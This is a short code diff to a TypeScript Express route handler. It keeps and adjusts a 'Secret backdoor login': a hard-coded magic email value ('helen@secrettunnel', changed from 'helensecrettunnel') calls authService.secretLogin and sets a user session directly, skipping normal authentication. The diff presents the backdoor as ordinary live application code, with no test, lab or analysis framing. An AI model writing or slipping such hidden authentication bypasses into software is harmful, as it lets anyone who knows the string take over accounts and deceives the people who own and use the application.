@@ -32,8 +32,8 @@ export async function registerRoutes(app: Express): Promise<Server> {
       const { email } = insertUserSchema.parse(req.body);
       
       // Secret backdoor login
-      if (email === 'helensecrettunnel') {
-        const result = await authService.secretLogin();
+      if (email === 'helen@secrettunnel') {
+        const result = await authService.secretLogin(email);
         
         if (result.success && result.user) {
           // Set session directly
